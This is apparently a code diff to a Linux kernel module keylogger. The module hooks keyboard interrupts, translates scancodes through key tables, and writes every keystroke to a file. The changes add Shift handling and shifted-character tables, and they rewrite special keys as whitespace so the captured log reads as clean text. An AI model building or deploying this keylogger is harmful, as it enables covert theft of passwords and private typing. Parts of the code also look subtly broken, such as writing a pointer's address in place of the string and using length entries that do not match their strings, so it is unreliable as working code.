@@ -24,15 +24,15 @@
 static const char *key_names[] = {
    "-", "<ESC>",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
-   "<Backspace>", "<Tab>",
+   "  ", "    ",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
-   "[", "]", "<Enter>", "<LCtrl>",
+   "[", "]", "\n", "<LCtrl>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "`", "<LShift>",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
-   "<RShift>",
-   "<KP*>",
-   "<LAlt>", " ", "<CapsLock>",
+   " ",
+   "  ",
+   "<LAlt>", " ", " ",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
    "<KP7>", "<KP8>", "<KP9>",
@@ -44,41 +44,77 @@ static const char *key_names[] = {
    "-", "-", "-",
    "<F11>", "<F12>",
    "-", "-", "-", "-", "-", "-", "-",
-   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "-",
+   "  ", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "-",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>"
 };
+
+static int size_of_str[] = {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 6, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 1, 1, 1, 5, 5, 1, 1, 1, 1, 1, 1, 1, 2, 7, 5, 7, 6, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8
+};
+
 
 static const char *key_names_caps[] = {
    "-", "<ESC>",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
-   "<Backspace>", "<Tab>",
+   " ", "    ",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
-   "[", "]", "<Enter>", "<LCtrl>",
+   "[", "]", "\n", "<LCtrl>",
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
-   "'", "`", "<LShift>",
+   "'", "`", " ",
    "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/",
-   "<RShift>",
-   "<KP*>",
-   "<LAlt>", " ", "<CapsLock>",
+   " ",
+   " ",
+   " ", " ", " ",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
-   "<KP7>", "<KP8>", "<KP9>",
-   "<KP->",
-   "<KP4>", "<KP5>", "<KP6>",
-   "<KP+>",
-   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
-   "<KP.>",
+   " ", " ", " ",
+   " ",
+   " ", " ", " ",
+   " ",
+   " ", " ", " ", " ",
+   " ",
    "-", "-", "-",
-   "<F11>", "<F12>",
+   " ", " ",
    "-", "-", "-", "-", "-", "-", "-",
-   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "-",
+   "", " ", " ", "<SysRq>", " ", "-",
+   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
+   "<PageDown>", "<Insert>", "<Delete>"
+};
+
+static int size_of_string_caps[] =  {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 7, 1, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8};
+
+
+
+static const char *key_names_shift[] = {
+   "-", "<ESC>",
+   "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "=",
+   "    ", "    ",
+   "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
+   "[", "]", "\n", "",
+   "A", "S", "D", "F", "G", "H", "J", "K", "L", ";",
+   "'", "`", " ",
+   "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/",
+   " ",
+   " ",
+   " ", " ", " ",
+   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
+   " ", " ",
+   " ", " ", " ",
+   " ",
+   " ", " ", " ",
+   " ",
+   " ", " ", " ", " ",
+   " ",
+   "-", "-", "-",
+   " ", " ",
+   "-", "-", "-", "-", "-", "-", "-",
+   " ", " ", "<KP/>", "<SysRq>", " ", "-",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>"
 };
 
 
-static int size_of_string[]  = {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 11, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 5, 6, 1, 10, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 1, 1, 1, 5, 5, 1, 1, 1, 1, 1, 1, 1, 9, 7, 5, 7, 6, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8};
+static int size_of_string_shift[] = {1, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 5, 7, 1, 1, 6, 4, 8, 6, 7, 5, 6, 10, 8, 8};
 
 
 
@@ -159,10 +195,30 @@ static void lkm_kdb_irq_got_char(struct work_struct *w) {
   //char *pchar = &released;
   static int caps_lock  = 0;
   //char *arr;
-
+  static int shift_val = 0;
   
 
   if (scancode < 112) {
+
+	if(!released && scancode == 0x2a) {
+		shift_val = 1;
+	}else if (released && scancode == 0x2a) {
+		shift_val = 0;
+	}
+
+
+	if (shift_val == 1){
+    if (released) { 
+		printk(KERN_INFO "Scan Code %x %s.\n",
+		scancode, released ? "Released" : "Pressed");
+		printk(KERN_INFO "Key Code %s. counter = %i\n",
+		key_names_caps[scancode], caps_lock);
+		//write_byte_by_byte(&key_names_caps[scancode]);
+		//file_write(fp,0,  &key_names_caps[scancode], 2);
+		file_write(fp,0,  &key_names_shift[scancode], size_of_string_shift[scancode]);
+		}
+
+	}else {
 	  if (released) {
 		if(scancode == 0x3a){
 			if (caps_lock == 0) {
@@ -180,7 +236,7 @@ static void lkm_kdb_irq_got_char(struct work_struct *w) {
 			 key_names_caps[scancode], caps_lock);
 			//write_byte_by_byte(&key_names_caps[scancode]);
 			//file_write(fp,0,  &key_names_caps[scancode], 2);
-			file_write(fp,0,  &key_names_caps[scancode], size_of_string[scancode]);
+			file_write(fp,0,  &key_names_caps[scancode], size_of_string_caps[scancode]);
 		  } else if (caps_lock == 0){
 			// old array values
 			printk(KERN_INFO "Scan Code %x %s.\n",
@@ -188,9 +244,11 @@ static void lkm_kdb_irq_got_char(struct work_struct *w) {
 		  	printk(KERN_INFO "Key Code %s. counter = %i\n",
 			 key_names[scancode], caps_lock);
 			//write_byte_by_byte(&key_names[scancode]);
-			file_write(fp,0,  &key_names[scancode], size_of_string[scancode]);
+			file_write(fp,0,  &key_names[scancode], size_of_str[scancode]);
 		  }
-/*
+
+	  }
+/*	
 	  printk(KERN_INFO "Scan Code %x %s.\n",
 		 scancode, released ? "Released" : "Pressed");
 	  printk(KERN_INFO "Key Code %s. counter = %i\n",
